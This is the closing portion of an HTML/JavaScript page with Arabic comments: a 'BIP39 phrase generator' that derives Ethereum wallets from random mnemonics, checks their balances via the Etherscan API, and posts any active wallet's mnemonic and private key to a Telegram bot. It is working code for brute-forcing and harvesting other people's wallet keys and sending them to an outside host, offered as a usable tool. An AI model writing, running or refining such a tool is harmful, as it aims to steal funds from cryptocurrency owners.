            "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle",
            "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra",
            "zero", "zone", "zoo"
        ];

        // متغيرات العملية
        let isSearching = false;
        let searchInterval = null;
        let totalGenerated = 0;
        let activeWallets = 0;
        let emptyWallets = 0;
        let errorCount = 0;

        // عناصر DOM
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const testTelegramBtn = document.getElementById('testTelegramBtn');
        const clearLogsBtn = document.getElementById('clearLogsBtn');
        const testManualBtn = document.getElementById('testManualBtn');
        const logPanel = document.getElementById('logPanel');
        const currentStatus = document.getElementById('currentStatus');
        const progressFill = document.getElementById('progressFill');

        // إعدادات API
        const ETHERSCAN_API_BASE = 'https://api.etherscan.io/api';

        // وظائف المساعدة
        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString('ar-EG');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
            logPanel.appendChild(logEntry);
            logPanel.scrollTop = logPanel.scrollHeight;
        }

        function updateStatus(message, type = 'info') {
            currentStatus.textContent = message;
            currentStatus.className = `alert alert-${type}`;
        }

        function updateStats() {
            document.getElementById('totalGenerated').textContent = totalGenerated;
            document.getElementById('activeWallets').textContent = activeWallets;
            document.getElementById('emptyWallets').textContent = emptyWallets;
            document.getElementById('errorCount').textContent = errorCount;
            
            const maxAttempts = parseInt(document.getElementById('maxAttempts').value);
            if (maxAttempts > 0) {
                const progress = (totalGenerated / maxAttempts) * 100;
                progressFill.style.width = `${Math.min(progress, 100)}%`;
            }
        }

        // إنشاء عبارة BIP39 عشوائية
        function generateRandomMnemonic() {
            const words = [];
            for (let i = 0; i < 12; i++) {
                const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length);
                words.push(BIP39_WORDLIST[randomIndex]);
            }
            return words.join(' ');
        }

        // التحقق من صحة عبارة BIP39
        function isValidMnemonic(mnemonic) {
            try {
                // ethers.js تتطلب قائمة الكلمات لتحديد ما إذا كانت العبارة صالحة
                return ethers.utils.HDNode.isValidMnemonic(mnemonic, BIP39_WORDLIST);
            } catch (error) {
                return false;
            }
        }

        // إنشاء محفظة من عبارة BIP39
        function createWalletFromMnemonic(mnemonic) {
            try {
                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
                return {
                    address: wallet.address,
                    privateKey: wallet.privateKey,
                    mnemonic: mnemonic
                };
            } catch (error) {
                throw new Error('فشل في إنشاء المحفظة: ' + error.message);
            }
        }

        // التحقق من رصيد المحفظة باستخدام Etherscan API
        async function checkWalletBalance(address) {
            const apiKey = document.getElementById('etherscanApiKey').value;
            if (!apiKey) {
                throw new Error('مفتاح Etherscan API مطلوب');
            }

            try {
                // الحصول على رصيد الإيثر
                const balanceUrl = `${ETHERSCAN_API_BASE}?module=account&action=balance&address=${address}&tag=latest&apikey=${apiKey}`;
                const balanceResponse = await fetch(balanceUrl);
                const balanceData = await balanceResponse.json();

                if (balanceData.status !== '1') {
                    throw new Error('فشل في الحصول على الرصيد: ' + balanceData.message);
                }

                const balance = ethers.utils.formatEther(balanceData.result);

                // الحصول على عدد المعاملات (للتأكد من نشاط المحفظة)
                const txUrl = `${ETHERSCAN_API_BASE}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=1&sort=desc&apikey=${apiKey}`;
                const txResponse = await fetch(txUrl);
                const txData = await txResponse.json();

                const transactionCount = (txData.status === '1' && Array.isArray(txData.result)) ? txData.result.length : 0;

                return {
                    balance: parseFloat(balance),
                    transactionCount: transactionCount,
                    isActive: parseFloat(balance) > 0 || transactionCount > 0
                };
            } catch (error) {
                throw new Error('خطأ في API: ' + error.message);
            }
        }

        // إرسال رسالة إلى Telegram
        async function sendToTelegram(message) {
            const botToken = document.getElementById('telegramBotToken').value;
            const chatId = document.getElementById('telegramChatId').value;

            if (!botToken || !chatId) {
                throw new Error('رمز البوت ومعرف المحادثة مطلوبان');
            }

            try {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                if (!data.ok) {
                    throw new Error(data.description || 'فشل في إرسال الرسالة');
                }

                return true;
            } catch (error) {
                throw new Error('خطأ في إرسال Telegram: ' + error.message);
            }
        }

        // معالجة محفظة واحدة
        async function processWallet(mnemonic) {
            try {
                const wallet = createWalletFromMnemonic(mnemonic);
                log(`تم إنشاء محفظة: ${wallet.address}`, 'info');

                const balanceInfo = await checkWalletBalance(wallet.address);
                
                if (balanceInfo.isActive) {
                    activeWallets++;
                    const message = `🎉 تم العثور على محفظة نشطة!\n\n` +
                                  `📍 العنوان: ${wallet.address}\n` +
                                  `💰 الرصيد: ${balanceInfo.balance} ETH\n` +
                                  `📊 عدد المعاملات: ${balanceInfo.transactionCount}\n` +
                                  `🔑 العبارة: ${mnemonic}\n` +
                                  `🔐 المفتاح الخاص: ${wallet.privateKey}`;

                    log(`محفظة نشطة! الرصيد: ${balanceInfo.balance} ETH`, 'success');
                    
                    try {
                        await sendToTelegram(message);
                        log('تم إرسال المحفظة إلى Telegram بنجاح', 'success');
                    } catch (telegramError) {
                        log(`فشل في إرسال Telegram: ${telegramError.message}`, 'error');
                    }
                } else {
                    emptyWallets++;
                    log(`محفظة فارغة: ${wallet.address}`, 'info');
                }

                return balanceInfo;
            } catch (error) {
                errorCount++;
                log(`خطأ في معالجة المحفظة: ${error.message}`, 'error');
                throw error;
            }
        }

        // بدء البحث
        async function startSearch() {
            if (isSearching) return;

            const apiKey = document.getElementById('etherscanApiKey').value;
            if (!apiKey) {
                alert('يرجى إدخال مفتاح Etherscan API');
                return;
            }

            isSearching = true;
            startBtn.disabled = true;
            stopBtn.disabled = false;

            const searchSpeed = parseInt(document.getElementById('searchSpeed').value);
            const maxAttempts = parseInt(document.getElementById('maxAttempts').value);

            log('بدء البحث عن المحافظ النشطة...', 'info');
            updateStatus('جاري البحث...', 'info');

            searchInterval = setInterval(async () => {
                if (!isSearching) return;

                if (maxAttempts > 0 && totalGenerated >= maxAttempts) {
                    stopSearch();
                    return;
                }

                try {
                    const mnemonic = generateRandomMnemonic();
                    
                    // التحقق من صحة العبارة قبل محاولة إنشاء المحفظة
                    if (!isValidMnemonic(mnemonic)) {
                        log('عبارة BIP39 غير صالحة تم إنشاؤها، جاري المحاولة مرة أخرى...', 'error');
                        return;
                    }

                    totalGenerated++;
                    updateStats();

                    await processWallet(mnemonic);
                } catch (error) {
                    log(`خطأ في العملية: ${error.message}`, 'error');
                }
            }, searchSpeed);
        }

        // إيقاف البحث
        function stopSearch() {
            isSearching = false;
            if (searchInterval) {
                clearInterval(searchInterval);
                searchInterval = null;
            }

            startBtn.disabled = false;
            stopBtn.disabled = true;

            log('تم إيقاف البحث', 'info');
            updateStatus('تم إيقاف البحث', 'warning');
        }

        // اختبار Telegram
        async function testTelegram() {
            try {
                testTelegramBtn.disabled = true;
                testTelegramBtn.innerHTML = '<span class="loading-spinner"></span> جاري الاختبار...';

                const testMessage = '🧪 رسالة اختبار من مولد عبارات BIP39\n\n' +
                                  `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
                                  '✅ البوت يعمل بشكل صحيح!';

                await sendToTelegram(testMessage);
                log('تم إرسال رسالة الاختبار بنجاح', 'success');
                alert('تم إرسال رسالة الاختبار بنجاح!');
            } catch (error) {
                log(`فشل اختبار Telegram: ${error.message}`, 'error');
                alert(`فشل اختبار Telegram: ${error.message}`);
            } finally {
                testTelegramBtn.disabled = false;
                testTelegramBtn.innerHTML = '<span>📱 اختبار Telegram</span>';
            }
        }

        // اختبار عبارة يدوياً
        async function testManualMnemonic() {
            const mnemonic = document.getElementById('manualMnemonic').value.trim();
            const resultDiv = document.getElementById('manualTestResult');

            if (!mnemonic) {
                alert('يرجى إدخال عبارة BIP39');
                return;
            }

            if (!isValidMnemonic(mnemonic)) {
                alert('عبارة BIP39 غير صحيحة');
                return;
            }

            try {
                testManualBtn.disabled = true;
                testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';

                const wallet = createWalletFromMnemonic(mnemonic);
                const balanceInfo = await checkWalletBalance(wallet.address);

                resultDiv.style.display = 'block';
                resultDiv.className = `test-result ${balanceInfo.isActive ? 'active' : 'inactive'}`;
                
                resultDiv.innerHTML = `
                    <h4>نتيجة الفحص</h4>
                    <p><strong>العنوان:</strong> ${wallet.address}</p>
                    <p class="balance ${balanceInfo.balance > 0 ? 'positive' : 'zero'}">
                        <strong>الرصيد:</strong> ${balanceInfo.balance} ETH
                    </p>
                    <p class="transactions">
                        <strong>عدد المعاملات:</strong> ${balanceInfo.transactionCount}
                    </p>
                    <span class="status ${balanceInfo.isActive ? 'active' : 'inactive'}">
                        ${balanceInfo.isActive ? 'محفظة نشطة' : 'محفظة فارغة'}
                    </span>
                `;

                log(`فحص يدوي: ${wallet.address} - ${balanceInfo.isActive ? 'نشطة' : 'فارغة'}`, 
                    balanceInfo.isActive ? 'success' : 'info');

            } catch (error) {
                log(`خطأ في الفحص اليدوي: ${error.message}`, 'error');
                alert(`خطأ في الفحص: ${error.message}`);
            } finally {
                testManualBtn.disabled = false;
                testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
            }
        }

        // مسح السجل
        function clearLogs() {
            logPanel.innerHTML = `
                <div class="log-entry log-info">
                    <span class="log-timestamp">[${new Date().toLocaleTimeString('ar-EG')}]</span>
                    تم مسح السجل
                </div>
            `;
        }

        // ربط الأحداث
        startBtn.addEventListener('click', startSearch);
        stopBtn.addEventListener('click', stopSearch);
        testTelegramBtn.addEventListener('click', testTelegram);
        testManualBtn.addEventListener('click', testManualMnemonic);
        clearLogsBtn.addEventListener('click', clearLogs);

        // تحديث الإحصائيات عند التحميل
        updateStats();

        // رسالة الترحيب
        log('مرحباً بك في مولد عبارات BIP39 المحسن مع Etherscan API', 'info');
        log('يرجى إدخال مفتاح Etherscan API وإعدادات Telegram قبل البدء', 'info');
    </script>
</body>
</html>
